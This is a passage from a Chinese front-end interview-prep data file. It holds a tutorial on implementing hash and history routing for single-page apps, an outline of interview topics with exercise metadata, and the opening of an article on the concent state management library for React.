'react-dom';\n\nReactDOM.render(\n<App/>,\ndocument.querySelector(\"#root\")\n)\n\n```\n\n* 引入`react-router或者 react-router-dom，dva`等路由跳转的库\n* 配置路由跳转\n\n```\n<HashRouter>//这里使用HashRouter\n      <ErrorBoundary>//React错误边界\n        <Switch>\n          <Route path=\"/login\" component={Login} />\n          <Route path=\"/home\" component={Home} />\n          <Route path=\"/\" component={NotFound} />//404路由或者重定向都可以\n        </Switch>\n      </ErrorBoundary>\n</HashRouter>\n\n```\n\n### 单页面应用所谓路由跳转，其实最终结果就是：\n\n* 浏览器的`url`地址发生变化，但是其实并没有发送请求，也没有刷新整个页面\n* 根据我们配置的路由信息，每次点击切换路由，会切换到不同的组件显示，类似于选项卡功能的实现,但是同时`url`地址栏会变化\n* 分为`HashRouter`和`BrowserRouter`两种模式\n\n## 自己实现一个粗略的路由跳转：\n\n### 自己实现传统的`Hash`模式跳转：\n\n> hash 就是指 url 后的 # 号以及后面的字符。例如`www.baidu.com/#segmentfault`,那么`#segmentfault`就是`hash`值\n\n* 需要用到的几个知识点：\n* `window.location.hash` = '\\*\\*\\*\\*'; // 设置当前的hash值\n* `const hash = window.location.hash` 获取当前的hash值\n* `hash`改变会触发`window`的`hashchange`事件\n\n```\nwindow.onhashchange=function(e){\n    let newURL = e.newURL; // 改变后的新 url地址\n    let oldURL = e.oldURL; // 改变前的旧 url地址\n}\n\n```\n\n> 这里特别注意，`hash`改变并不会发送请求\n\n### 开始实现`Hash`模式跳转：\n\n#### 使用类似发布订阅模式的方式，使用`ES6`的class实现：\n\n* 初始订阅，每个不同的`hash`值，对应不同的函数调用处理。\n\n```\nclass Router {\n  constructor() {\n    this.routes = {};\n    this.currentUrl = '';\n  }\n  route(path, callback) {\n    this.routes[path] = callback || function() {};\n  }\n  updateView() {\n    this.currentUrl = location.hash.slice(1) || '/';\n    this.routes[this.currentUrl] && this.routes[this.currentUrl]();\n  }\n  init() {\n    window.addEventListener('load', this.updateView.bind(this), false);\n    window.addEventListener('hashchange', this.updateView.bind(this), false);\n  }\n}\n\n```\n\n* routes 用来存放不同路由对应的回调函数\n* init 用来初始化路由，在 load 事件发生后刷新页面，并且绑定 hashchange 事件，当 hash 值改变时触发对应回调函数\n\n#### 开始使用：\n\n```\n<div id=\"app\">\n  <ul>\n    <li>\n      <a href=\"#/\">home</a>\n    </li>\n    <li>\n      <a href=\"#/about\">about</a>\n    </li>\n    <li>\n      <a href=\"#/topics\">topics</a>\n    </li>\n  </ul>\n  <div id=\"content\"></div>\n</div>\n<script src=\"js/router.js\"></script>\n<script>\n  const router = new Router();\n  router.init();\n  router.route('/', function () {\n    document.getElementById('content').innerHTML = 'Home';\n  });\n  router.route('/about', function () {\n    document.getElementById('content').innerHTML = 'About';\n  });\n  router.route('/topics', function () {\n    document.getElementById('content').innerHTML = 'Topics';\n  });\n</script>\n\n```\n\n> 这样一个简单的`hash`模式路由就做好了，剩下的就是路由嵌套，以及错误边界的处理\n\n### `History`模式实现：\n\n* `History`来自`Html5`的规范\n* `History`模式，`url`地址栏的改变并不会触发任何事件\n* `History`模式，可以使用`history.pushState`,`history.replaceState`来控制`url`地址,history.pushState() 和 history.replaceState() 的区别在于：\n* `history.pushState()` 在保留现有历史记录的同时，将 url 加入到历史记录中。\n* `history.replaceState()` 会将历史记录中的当前页面历史替换为 url。\n* `History`模式下，刷新页面会404，需要后端配合匹配一个任意路由，重定向到首页，特别是加上`Nginx`反向代理服务器的时候\n\n> 我们需要换个思路，我们可以罗列出所有可能触发 history 改变的情况，并且将这些方式一一进行拦截，变相地监听 history 的改变。\n\n### 对于一个应用而言，url 的改变(不包括 hash 值得改变)只能由下面三种情况引起：\n\n* 点击浏览器的前进或后退按钮\n* 点击 a 标签\n* 在 JS 代码中触发 history.push(replace)State 函数\n\n> 只要对上述三种情况进行拦截，就可以变相监听到 history 的改变而做出调整。针对情况 1，HTML5 规范中有相应的 onpopstate 事件，通过它可以监听到前进或者后退按钮的点击，值得注意的是，调用 history.push(replace)State 并不会触发 onpopstate 事件。\n\n### 开始实现：\n\n```\nclass Router {\n  constructor() {\n    this.routes = {};\n    this.currentUrl = '';\n  }\n  route(path, callback) {\n    this.routes[path] = callback || function() {};\n  }\n  updateView(url) {\n    this.currentUrl = url;\n    this.routes[this.currentUrl] && this.routes[this.currentUrl]();\n  }\n  bindLink() {\n    const allLink = document.querySelectorAll('a[data-href]');\n    for (let i = 0, len = allLink.length; i < len; i++) {\n      const current = allLink[i];\n      current.addEventListener(\n        'click',\n        e => {\n          e.preventDefault();\n          const url = current.getAttribute('data-href');\n          history.pushState({}, null, url);\n          this.updateView(url);\n        },\n        false\n      );\n    }\n  }\n  init() {\n    this.bindLink();\n    window.addEventListener('popstate', e => {\n      this.updateView(window.location.pathname);\n    });\n    window.addEventListener('load', () => this.updateView('/'), false);\n  }\n}\n\n```\n\n### Router 跟之前 Hash 路由很像，不同的地方在于：\n\n* init 初始化函数，首先需要获取所有特殊的链接标签，然后监听点击事件，并阻止其默认事件，触发 history.pushState 以及更新相应的视图。\n* 另外绑定 popstate 事件，当用户点击前进或者后退的按钮时候，能够及时更新视图，另外当刚进去页面时也要触发一次视图更新。\n\n### 实际使用：\n\n```\n<div id=\"app\">\n  <ul>\n    <li><a data-href=\"/\" href=\"#\">home</a></li>\n    <li><a data-href=\"/about\" href=\"#\">about</a></li>\n    <li><a data-href=\"/topics\" href=\"#\">topics</a></li>\n  </ul>\n  <div id=\"content\"></div>\n</div>\n<script src=\"js/router.js\"></script>\n<script>\n  const router = new Router();\n  router.init();\n  router.route('/', function() {\n    document.getElementById('content').innerHTML = 'Home';\n  });\n  router.route('/about', function() {\n    document.getElementById('content').innerHTML = 'About';\n  });\n  router.route('/topics', function() {\n    document.getElementById('content').innerHTML = 'Topics';\n  });\n</script>\n\n```\n\n* 跟之前的 html 基本一致，区别在于用 data-href 来表示要实现软路由的链接标签。\n* 当然上面还有情况 3，就是你在 JS 直接触发 pushState 函数，那么这时候你必须要调用视图更新函数，否则就是出现视图内容和 url 不一致的情况。\n\n```\nsetTimeout(() => {\n  history.pushState({}, null, '/about');\n  router.updateView('/about');\n}, 2000);\n\n```\n\n### `React-router-dom`源码：\n\n#### `Router`组件：\n\n```\n\nexport class Route extends Component {\n  componentWillMount() {\n    window.addEventListener('hashchange', this.updateView, false);\n  }\n  componentWillUnmount() {\n    window.removeEventListener('hashchange', this.updateView, false);\n  }\n  updateView = () => {\n    this.forceUpdate();\n  }\n  render() {\n    const { path, exact, component } = this.props;\n    const match = matchPath(window.location.hash, { exact, path });\n    if (!match) {\n      return null;\n    }\n    if (component) {\n      return React.createElement(component, { match });\n    }\n    return null;\n  }\n}\n\n```\n\n* 组件挂载监听`hash change`原生事件，将要卸载时候移除事件监听防止内存泄漏\n* 每次`hash`改变，就触发所有对应`hash`的回掉，所有的`Router`都去更新视图\n* 每个`Router`组件中，都去对比当前的`hash`值和这个组件的`path`属性，如果不一样，那么就返回`null`,·否则就渲染这个组件对应的视图\n\n### `History`模式的实现：\n\n![](https://static.ecool.fun//article/564e9141-9a14-4e33-be80-cf66b068683e.awebp)\n\n[实现History](https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F31874420 \"https://zhuanlan.zhihu.com/p/31874420\")\n\n> 这里想多留些时间写其他源码，这篇文章写得非常好，大家也可以去看看，本文很多借鉴他的。\n\n### `withRouter`高阶函数的源码：\n\n```\nvar withRouter = function withRouter(Component) {\n  var C = function C(props) {\n    var wrappedComponentRef = props.wrappedComponentRef,\n        remainingProps = _objectWithoutProperties(props, [\"wrappedComponentRef\"]);\n\n    return _react2.default.createElement(_Route2.default, {\n      children: function children(routeComponentProps) {\n        return _react2.default.createElement(Component, _extends({}, remainingProps, routeComponentProps, {\n          ref: wrappedComponentRef\n        }));\n      }\n    });\n  };\n\n  C.displayName = \"withRouter(\" + (Component.displayName || Component.name) + \")\";\n  C.WrappedComponent = Component;\n  C.propTypes = {\n    wrappedComponentRef: _propTypes2.default.func\n  };\n\n  return (0, _hoistNonReactStatics2.default)(C, Component);\n};\n\n```\n\n* 传入一个组件，返回一个新的组件，并且给这个组件赋予全局属性，拥有路由组件的三大属性\n\n### `Switch`组件：\n\n```\nSwitch.prototype.render = function render() {\n    var route = this.context.router.route;\n    var children = this.props.children;\n\n    var location = this.props.location || route.location;\n\n    var match = void 0,\n        child = void 0;\n    _react2.default.Children.forEach(children, function (element) {\n      if (match == null && _react2.default.isValidElement(element)) {\n        var _element$props = element.props,\n            pathProp = _element$props.path,\n            exact = _element$props.exact,\n            strict = _element$props.strict,\n            sensitive = _element$props.sensitive,\n            from = _element$props.from;\n\n        var path = pathProp || from;\n\n        child = element;\n        match = (0, _matchPath2.default)(location.pathname, { path: path, exact: exact, strict: strict, sensitive: sensitive }, route.match);\n      }\n    });\n\n    return match ? _react2.default.cloneElement(child, { location: location, computedMatch: match }) : null;\n  };\n\n```\n\n* 遍历所以传入的子元素\n* 如果有符合的路由对应的元素，那么就返回，而且只匹配这一个路由。不再继续往下匹配\n* 如果第二条没有找到符合的元素，那么抛出错误",
    "testPoint": "## 一、SPA 的核心概念与原理\n\n**考察重点：**\n\n* SPA 与 MPA 的区别（单页应用 vs 多页应用）\n* SPA 的本质：**前端接管路由 + 局部刷新渲染 + 状态持久**\n* 单页架构的优缺点：\n\n  * 优点：用户体验流畅、前后端分离、开发效率高\n  * 缺点：首屏加载慢、SEO 不友好、复杂状态管理\n\n**典型问题：**\n\n* 请解释一下什么是单页面应用？它和多页面应用有何区别？\n* 为什么现代前端框架普遍采用 SPA 架构？\n* SPA 的缺点有哪些？你在项目中如何应对？\n\n---\n\n## 二、前端路由机制（核心考点）\n\n**考察重点：**\n\n* 前端路由的两种实现方式：\n\n  1. **Hash 模式**（依赖 `window.onhashchange`）\n  2. **History 模式**（依赖 HTML5 History API，如 `pushState`/`replaceState`）\n* 路由与组件渲染的映射机制\n* 浏览器刷新时的 404 问题与 Nginx 配置重定向\n* 动态路由与懒加载机制\n* 嵌套路由、路由守卫、导航守卫（beforeEach、onEnter）\n\n**典型问题：**\n\n* 你能解释一下前端路由是如何实现的吗？\n* 为什么 History 模式在刷新时会 404？如何解决？\n* 在 React 或 Vue 中如何实现路由懒加载？\n* 路由跳转时如何做权限校验？\n\n---\n\n## 三、首屏加载与性能优化\n\n**考察重点：**\n\n* SPA 首屏性能瓶颈：**JS 体积大、阻塞渲染、数据依赖多**\n* 优化手段：\n\n  * 代码分割、懒加载（`dynamic import`）\n  * 资源预加载（`<link rel=\"preload\">`）\n  * 骨架屏 / loading 占位\n  * SSR / SSG / Prerender\n  * 缓存策略（localStorage、indexedDB、Service Worker）\n* 打包优化：Tree-shaking、动态 Polyfill、CDN 分发\n\n**典型问题：**\n\n* 为什么 SPA 首屏加载慢？如何优化？\n* 你在项目中如何衡量并优化首屏渲染时间？\n* 是否用过骨架屏？如何实现？\n* SSR 与 CSR 的区别？哪种更适合你的业务？\n\n---\n\n## 四、状态管理与页面间数据共享\n\n**考察重点：**\n\n* 全局状态管理工具的选择与设计（Redux、Zustand、MobX、Pinia、Vuex）\n* 单页多模块间数据同步\n* 状态持久化（localStorage + redux-persist）\n* 页面切换时的状态保留策略（keep-alive、缓存路由组件）\n\n**典型问题：**\n\n* SPA 中多个页面之间如何共享数据？\n* 你如何在 React/Vue 中实现页面状态缓存？\n* Redux / Vuex 为什么适合单页应用？\n\n---\n\n## 五、SEO 与可访问性问题\n\n**考察重点：**\n\n* SPA 对 SEO 的影响（内容渲染在客户端）\n* 解决方案：\n\n  * **SSR（服务端渲染）**\n  * **静态化预渲染（Prerender）**\n  * **动态渲染（Dynamic Rendering）**\n* 是否理解 SSR 的原理与前后端同构机制\n\n**典型问题：**\n\n* 为什么单页面应用不利于 SEO？\n* 你知道哪些改善 SEO 的方案？\n* SSR、SSG、Prerender 各有什么适用场景？\n\n---\n\n## 六、页面切换与体验优化\n\n**考察重点：**\n\n* 路由切换动画实现方式（Transition / Framer Motion）\n* 滚动位置还原、懒加载与预加载\n* SPA 下的浏览器前进/后退行为管理\n* 缓存页面状态与回退体验（如 keep-alive、React Router `useNavigate(-1)`）\n\n**典型问题：**\n\n* 单页应用如何实现页面切换动画？\n* 如何在页面回退时保持滚动位置？\n* React Router 中如何实现页面缓存？\n\n---\n\n## 七、工程架构与部署策略\n\n**考察重点：**\n\n* 前后端分离架构下的 SPA 部署流程\n* 静态资源路径管理、Nginx 配置、路由重写\n* 灰度发布、版本缓存控制\n* 与后端接口的协作（API Gateway / BFF）\n\n**典型问题：**\n\n* SPA 应用如何配置 Nginx？\n* 当路径直接访问子页面时如何避免 404？\n* 如何在单页架构中支持国际化、多主题？\n\n---\n\n## 八、安全与容错\n\n**考察重点：**\n\n* 路由权限控制（前端路由守卫 + token 校验）\n* 登录态维护与刷新机制（cookie / token / refresh token）\n* 错误边界处理与白屏监控\n* 版本更新提示与缓存失效策略（Service Worker + manifest 版本对比）\n\n**典型问题：**\n\n* SPA 如何实现路由级别的权限校验？\n* 用户 token 过期时如何优雅地处理？\n* 如何避免单页应用白屏问题？\n\n---\n\n## 九、进阶与扩展方向\n\n**考察重点：**\n\n* **微前端（Micro-Frontend）**：将多个 SPA 组合成一个系统\n* **多实例 SPA 与路由隔离**\n* **同构渲染与前后端协作模式（Next.js、Nuxt.js）**\n\n**典型问题：**\n\n* 你对微前端架构的理解？\n* 微前端与传统 SPA 的关系是什么？\n* SSR 是如何解决 SPA 的首屏性能和 SEO 问题的？\n",
    "exerciseKeyList": "[\"ad98f8b2-58de-446b-a9ec-2660f1c2e581\",\"5cb71435-19b4-45ef-bcee-f2d9825af25e\",\"c14803df-f552-4a23-b50d-fd8e3f77f17e\",\"a5032eb9-6a53-4792-852f-3f9417631c47\",\"73413861-0e94-4d71-bff3-65e8515ddc17\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-08-07T03:21:32.000Z",
    "updateAt": "2025-10-23T08:46:06.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "5cb71435-19b4-45ef-bcee-f2d9825af25e",
        "title": "SPA首屏加载速度慢的怎么解决",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-09T14:40:13.000Z"
      },
      {
        "exerciseKey": "73413861-0e94-4d71-bff3-65e8515ddc17",
        "title": "说说你对SPA的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:29:04.000Z",
        "updateAt": "2024-08-10T17:04:37.000Z"
      },
      {
        "exerciseKey": "a5032eb9-6a53-4792-852f-3f9417631c47",
        "title": "SPA（单页应用）首屏加载速度慢怎么解决？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:34:05.000Z",
        "updateAt": "2024-08-10T17:04:39.000Z"
      },
      {
        "exerciseKey": "ad98f8b2-58de-446b-a9ec-2660f1c2e581",
        "title": "为什么 SPA 应用都会提供一个 hash 路由，好处是什么？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-09-02T01:28:41.000Z"
      },
      {
        "exerciseKey": "c14803df-f552-4a23-b50d-fd8e3f77f17e",
        "title": "SPA应用怎么进行SEO？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-08-12T11:58:16.000Z",
        "updateAt": "2024-07-22T10:05:27.000Z"
      }
    ]
  },
  "274": {
    "id": 274,
    "tagId": 28,
    "title": "状态管理工程化",
    "explanation": "> 状态管理是一个前端界老生常谈的话题了，所有前端框架的发展历程中都离不开状态管理的迭代与更替，对于react来说呢，整个状态管理的发展也随着react架构的变更和新特性的加入而不停的做调整，作为一个一起伴随react成长了快5年的开发者，经历过reflux、redux、mobx，以及其他redux衍生方案dva、mirror、rematch等等后，我觉得它们都不是我想要的状态管理的终极形态，所以为了打造一个和react结合得最优雅、使用起来最简单、运行起来最高效的状态管理方案，踏上了追梦旅途。\n\n## 为何需要状态管理\n\n为何需要在前端引用里引入状态管理，基本上大家都达成了共识，在此我总结为3点：\n\n* 随着应用的规模越来越大，功能越来越复杂，组件的抽象粒度会越来越细，在视图中组合起来后层级也会越来越深，能够方便的**跨组件共享状态**成为迫切的需求。\n* 状态也需要按模块切分，状态的变更逻辑背后其实就是我们的业务逻辑，将其抽离出来能够彻底**解耦ui和业务**，有利于逻辑复用，以及持续的维护和迭代。\n* 状态如果能够被集中的管理起来，并合理的派发有利于组件**按需更新**，缩小渲染范围，从而提高渲染性能\n\n## 已有状态管理方案现状\n\n### redux\n\n遵循react不可变思路的状态管理方案，无论从git的star排名还是社区的繁荣度，首推的一定是`redux`这个react界状态管理一哥，约束使用唯一路径`reducer`纯函数去修改store的数据，从而达到整个应用的状态流转清晰、可追溯。\n\n![image.png](https://static.ecool.fun//article/f398c72d-defa-459b-9168-3bd12fd1cdd8.png)\n\nimage.png\n\n### mbox\n\n遵循响应式的后期之秀`mbox`，提出了`computed`、`reaction`的概念，其官方的口号就是**任何可以从应用程序状态派生的内容都应该派生出来**，通过将原始的普通json对象转变为可观察对象，我们可以直接修改状态，`mbox`会自动驱动ui渲染更新，因其响应式的理念和`vue`很相近，在`react`里搭配`mobx-react`使用后，很多人戏称`mobx`是一个将`react`变成了类`vue`开发体验的状态管理方案。\n\n![image.png](https://static.ecool.fun//article/1d77e4b0-5c7d-4f85-8abd-1324bc69cadc.png)\n\nimage.png\n\n当然因为`mbox`操作数据很方便，不满足大型应用里对状态流转路径清晰可追溯的诉求，为了约束用户的更新行为，配套出了一个`mobx-state-tree`，总而言之，`mobx`成为了响应式的代表。\n\n### 其他\n\n剩下的状态管理方案，主要有3类。\n\n一类是不满足`redux`代码冗余啰嗦，接口不够友好等缺点，进而在`redux`之上做2次封装，典型的代表国外的有如`rematch`，国内有如`dva`、`mirror`等，我将它们称为`redux`衍生的家族作品，或者是解读了`redux`源码，整合自己的思路重新设计一个库，如`final-state`、`retalk`、`hydux`等，我将它们称为类`redux`作品。\n\n一类是走响应式道路的方案，和`mobx`一样，劫持普通状态对象转变为可观察对象，如`dob`，我将它们称为类`mobx`作品。\n\n剩下的就是利用`react context api`或者最新的`hook`特性，主打轻量，上手简单，概念少的方案，如`unstated-next`，`reactn`、`smox`、`react-model`等。\n\n## 我心中的理想方案\n\n上述相关的各种方案，都各自在一定程度上能满足我们的需求，但是对于追求完美的水瓶座程序猿，我觉得它们终究都不是我理想的方案，它们或小而美、或大而全，但还是不够强，不够友好，所以决定开始自研状态管理方案。\n\n我知道小和 美、全、强本身是相冲突的，我能接受一定量的大，gzip后10kb到20kb都是我接受的范围，在此基础上，去逐步地实现美、全、强，以便达到以下目的，从而体现出和现有状态管理框架的差异性、优越性。\n\n* 让新手使用的时候，无需了解新的特性api，无感知状态管理的存在，使其遁于无形之中，仅按照react的思路组织代码，就能享受到状态管理带来的福利。\n* 让老手可以结合对状态管理的已有认知来使用新提供的特性api，还原各种社区公认的最佳实践，同时还能向上继续探索和提炼，挖掘状态管理带来的更多收益。\n* 在`react`有了`hook`特性之后，让class组件和function组件都能够享有一致的思路、一致的api接入状态管理，不产生割裂感。\n* 在保持以上3点的基础上，让用户能够使用更精简且更符合思维直觉的组织方式书写代码，同时还能够获得巨大的性能提升收益。\n\n为了达成以上目标，立项`concent`，将其定义为一个**可预测、零入侵、渐进式、高性能的增强型状态管理方案**，期待能把他打磨成为一个真真实实让用户用起来感觉到美丽、全面、强大的框架。\n\n> 说人话就是：理解起来够简单、代码写起来够优雅、工程架构起来够健壮、性能用起来够卓越...... ^\\_^\n\n![concent.png](https://static.ecool.fun//article/923ee099-e4b5-40c7-9a8b-9befa1136952.png)\n\nconcent.png\n\n### 可预测\n\n`react`是一个基于`pull based`来做变化侦测的ui框架，对于用户来说，需要显式的调用`setState`来让`react`感知到状态变化，所以`concent`遵循react经典的不可变原则来体现可预测，不使用劫持对象将转变为可观察对象的方式来感知状态变化（要不然又成为了一个类`mobx`......）, 也不使用时全局`pub&sub`的模式来驱动相关视图更新，同时还要配置各种`reselect`、`redux-saga`等[中间件](https://cloud.tencent.com/product/message-queue-catalog?from_column=20065&from=20065)来解决计算缓存、异步action等等问题（如果这样，岂不是又迈向了一个redux全家桶轮子的不归路..... ）\n\n> 吐槽一下：redux粗放的订阅粒度在组件越来越多，状态越来越复杂的时候，经常因为组件订阅了不需要的数据而造成冗余更新，而且各种手写mapXXXToYYY很烦啊有木有啊有木有，伤不起啊伤不起......\n\n### 零入侵\n\n上面提到了期望新手仅按照react的思路组织代码，就能够享受到状态管理带来的福利，所以必然只能在`setState`之上做文章，其实我们可以把`setState`当做一个下达渲染指令重要入口（除此之外，还有`forceUpdate`）。\n\n![setState，下达更新指令](https://static.ecool.fun//article/7b332e15-9115-4381-bc1b-311199dbb877.png)\n\nsetState，下达更新指令\n\n仔细看看上图，有没有发现有什么描述不太准确的地方，我们看看官方的`setState`函数签名描述:\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\nsetState<K extends keyof S>(\n    state: ((prevState: Readonly<S>, props: Readonly<P>) => (Pick<S, K> | S | null)) | (Pick<S, K> | S | null),\n    callback?: () => void\n): void;\n```\n\n\b通过签名描述，我们可以看出传递给`setState`的是一个部分状态(片段状态)，实际上我们在调用`setState`也是经常这么做的，修改了谁就传递对应的`stateKey`和值。\n\n![传递部分状态](https://static.ecool.fun//article/698d734d-005e-4ed8-a2d1-008465309e43.png)\n\n传递部分状态\n\nreact自动将部分状态**合并**到原来的整个状态对象里从而覆盖掉其对应的旧值，然后驱动对应的视图更新。\n\n![merge partial state](https://static.ecool.fun//article/0e915116-bf82-49e5-88d3-926c18321f0c.png)\n\nmerge partial state\n\n所以我只要能够让`setState`提交的状态给自己的同时，也能够将其提交到store并分发到其他对应的实例上就达到了我的目的。\n\n![set state Intelligently](https://static.ecool.fun//article/e0197da1-2fd0-4587-a95f-ebc799badcfd.png)\n\nset state Intelligently\n\n显而易见我们需要劫持`setState`，来注入一些自己的逻辑，然后再调用`原生setState`。\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n//伪代码实现\nclass Foo extends Component{\n  constructor(props, context){\n    this.state = { ... };\n    this.reactSetState = this.setState.bind(this);\n    this.setState = (partialState, callback){\n      //commit partialState to store .....\n      this.reactSetState(partialState, callback);\n    }\n  }\n}\n```\n\n当然作为框架提供者，肯定不会让用户在`constructor`去完成这些额外的注入逻辑，所以设计了两个关键的接口`run`和`register`，`run`负责载入模块配置，`register`负责注册组件设定其所属模块，被注册的组件其`setState`就得到了增强，其提交的状态不仅能够触发渲染更新，还能够直接提交到store，同时分发到这个模块的其他实例上。\n\n> store虽然是一颗单一的状态树，但是实际业务逻辑是由很多模块的，所以我将store的第一层key当做模块名（类似命名空间），这样就产生了模块的概念\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n//concent代码示意\nimport { run, register } from 'concent';\n\nrun({\n  foo:{//foo模块定义\n    state:{\n      name: 'concent',\n    }\n  }\n})\n\n@register('foo')\nclass Foo extends Component {\n  changeName = ()=> {\n    this.setState({ name: e.currentTarget.value });//修改name\n  }\n  render(){\n    const { name } = this.state;//读取name\n    return <input value={name} onChange={this.changeName} />\n  }\n}\n```\n\n[在线示例代码见此处](/developer/tools/blog-entry?target=https%3A%2F%2Fstackblitz.com%2Fedit%2Fconcent-doc-home-demo&objectId=1516577&objectType=1&isNewArticle=undefined)\n\n现在我们来看看上面这段代码，除了没有显示的在`Foo`组件里声明state，其他地方看起来是不是给你一种感觉：这不就是一个地地道道的react组件标准写法吗？concent将接入状态管理的成本降低到了几乎可忽略不计的地步。\n\n当然，也允许你在组件里声明其他的非模块状态，这样的话它们就相当于私有状态了，如果`setState`提交的状态既包含模块的也包含非模块的，模块状态会被当做`sharedState`提取出来分发到其他实例，privName仅提交给自己。\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n@register('foo')\nclass Foo extends Component {\n  state = { privName: 'i am private, not from store' };\n  fooMethod = ()=>{\n    //name会被当做sharedState分发到其他实例，privName仅提交给自己\n    this.setState({name: 'newName', privName: 'vewPrivName' });\n  }\n  render(){\n    const { name, privName } = this.state;//读取name, privName\n  }\n}\n```\n\n在这样的模式下，你可以在任何地方实例化多个`Foo`，任何一个实例改变`name`的值，其他实例都会被更新，而且你也不需要在顶层的根组件处包裹类似`Provider`的辅助标签来注入store上下文。\n\n之所以能够达到此效果，得益于`concent`的核心工作原理**依赖标记**、**引用收集**、**状态分发**，它们将在下文叙述中被逐个提到。\n\n### 渐进式\n\n能够通过作为`setState`作为入口接入状态管理，且还能区分出共享状态和私有状态，的确大大的提高了我们操作模块数据的便利性，但是这样就足够用和足够好了吗？\n\n#### 更细粒度的控制数据消费\n\n组件对消费模块状态的粒度并不总是很粗的和模块直接对应的关系，即属于模块foo的组件`CompA`可能只消费模块foo里的`f1`、`f2`、`f3`三个字段对应的值，而属于模块foo的组件`CompB`可能只消费模块foo里另外的`f4`、`f5`、`f6`三个字段对应的值，我们当然不期望`CompA`的实例只修改了`f2`、`f3`时却触发了的`CompB`实例渲染。\n\n大多数时候我们期望组件和模块保持的是一对一的关系，即一个组件只消费某一个模块提供的数据，但是现实情况的确存在一个组件消费多个模块的数据。\n\n所以针对`register`接口，我们需要传入更多的信息来满足**更细粒度的数据消费需求**。\n\n* 通过`module`标记组件属于哪个具体的模块\n\n> 这是一个可选项，不指定的话就让其属于内置的`$$default`模块（一个空模块），有了`module`，就能够让concent在其组件实例化之后将模块的状态注入到实例的`state`上了。\n\n* 通过`watchedKeys`标记组件观察所属模块的stateKey范围\n\n> 这是一个可选项，不传入的话，默认就是观察所属模块所有stateKey的变化，通过`watchedKeys`来定义一个stateKey列表，控制同模块的其他组件提交新状态时，自己需不需要被渲染更新。\n\n* 通过`connect`标记连接的其他模块\n\n> 这是一个可选项，让用户使用`connect`参数去标记连接的其他模块，设定在其他模块里的观察stateKey范围。\n\n* 通过`ccClassKey`设定当前组件类名\n\n> 这是一个可选项，设定后方便在`react dom tree`上查看具名的concent组件节点，如果不设定的话，concent会自动更根据其`module`和`connect`参数的值算出一个，此时注册了同一个模块标记了相同`connect`参数的不同react组件在`react dom tree`上看到的就是相同的标签名字。\n\n通过以上register提供的这些关键参数为组件打上标记，完成了`concent`核心工作原理里很重要的一环：**依赖标记**，所以当这些组件实例化后，它们作为数据消费者，身上已经携带了足够多的信息，以更细的粒度来消费所需要的数据。\n\n从`store`的角度看类与模块的关系\n\n![image.png](https://static.ecool.fun//article/c77f3f11-33a8-4693-adb1-1463573fd8b9.png)\n\nimage.png\n\n实例的`state`作为数据[容器](https://cloud.tencent.com/product/tke?from_column=20065&from=20065)已经盛放了所属模块的状态，那么当使用`connect`让组件连接到其他多个模块时，这些数据又该怎么注入呢？跟着这个问题我们回想一下上面提到过的，某个实例调用`setState`时提交的状态会被`concent`提取出其所属模块状态，将它作为`sharedState`精确的分发到其他实例。\n\n能够做到精确分发，是因为当这些注册过的组件在实例化的时候，`concent`就会为其构建了一个实例上下文`ctx`，一个实例对应着一个唯一的`ctx`，然后`concent`这些`ctx`引用精心保管在全局上下文`ccContext`里（一个单例对象，在`run`的时候创建），所以说组件的实例化过程完成了`concent`核心工作原理里很重要的一环：**引用收集**，当然了，实例销毁后，对应的`ctx`也会被删除。\n\n\b有了`ctx`对象，`concent`就可以很自然将各种功能在上面实现了，上面提到的连接了多个模块的组件，其模块数据将注入到`ctx.connectedState`下，通过具体的模块名去获取对应的数据。\n\n![ctx.png](https://static.ecool.fun//article/c7556f3b-b5d2-4f90-9327-dd09cde4b769.png)\n\nctx.png\n\n我们可以在代码里很方便的构建跨多个模块消费数据的组件，并按照stateKey控制消费粒度\n\n代码语言：txt\n\nAI代码解释\n\n复制\n\n```\n//concent代码示意\nimport { run, register, getState } from 'concent';\n\nrun({\n  foo:{//foo模块定义\n    state:{\n      name: 'concent',\n      age: 19,\n      info: { addr: 'bj', mail: 'xxxx@qq.com' },\n    }\n  },\n  bar: { ... },\n  baz: { ... },\n})\n\n//不设定watchedKeys，观察foo模块所有stateKey的值变化\n//等同于写为 @register({module:'foo', watchedKeys:'*' })\n@register('foo')\nclass Foo1 extends Component { ... }\n\n//当前组件只有在foo模块的'name', 'info'值发生变化时才触发更新\n//显示的设定ccClassKey名称，方便查看引用池时知道来自哪个类\n@register({module:'foo', watchedKeys:['name', 'info'] }, 'Foo2')\nclass Foo2 extends Component { ... }\n\n//连接bar、baz两个模块，并定义其连接模块的watchKeys\n@register({\n  module:'foo',\n  watchedKeys:['name', 'info'] ,\n  connect: { bar:['bar_f1', 'bar_f2'], baz:'*' }\n}, 'Foo2')\nclass Foo2 extends Component {\n  render(){\n    //获取到bar,baz两个模块的数据\n    const { bar, baz } = this.ctx.connectedState;\n  }\n }\n```\n\n上面提到了能够做到精确分发是因为`concent`将实例的`ctx`引用做了精心保管，何以体现呢？因为`concent`为这些引用做了两层映射关系，并将其存储在全局上下文里，以便高效快速的索引到相关实例引用做渲染更新。\n\n* 按照各自所属的不同模块名做第一层归类映射。\n\n> 模块下存储的是一个所有指向该模块的`ccClassKey`类名列表, 当某个实例提交新的状态时，通过它携带者的所属模块，直接一步定位到这个模块下有哪些类存在。\n\n* 再按照其各自的`ccClassKey`类名做第二层归类映射。\n\n> `ccClassKey`下存储的就是这个cc类对应的上下文对象`ccClassContext`，它包含很多关键字段，如`refs`是已近实例好的组件对应的`ctx`引用索引数组，`watchedKeys`是这个cc类观察key范围。\n\n上面提到的`ccClassContext`是配合`concent`完成**状态分发**的最重要的元数据描述对象，整个过程只需如下2个步骤：\n\n* 1 